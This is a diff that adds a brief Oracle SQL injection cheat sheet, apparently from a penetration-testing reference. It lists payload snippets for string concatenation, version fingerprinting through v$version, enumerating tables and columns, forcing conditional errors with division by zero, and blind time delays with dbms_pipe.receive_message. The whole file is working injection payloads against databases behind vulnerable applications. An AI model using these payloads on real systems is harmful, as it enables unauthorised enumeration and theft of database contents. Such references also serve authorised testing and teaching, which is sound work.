@@ -1,0 +1,25 @@
+String concatenation
+'foo'||'bar'
+
+Substring
+SUBSTR('foobar', 4, 2)
+
+Comments
+--coment
+
+Database version
+SELECT banner FROM v$version
+SELECT version FROM v$instance
+
+Database contents
+SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE_NAME_HERE'
+
+Conditional errors
+SELECT CASE WHEN (YOUR_CONDITION_HERE) THEN to_char(1/0) ELSE NULL END FROM dual
+
+Time delays
+dbms_pipe.receive_message(('a'),10)
+
+Conditional time delays
+SELECT CASE WHEN (YOUR_CONDITION_HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
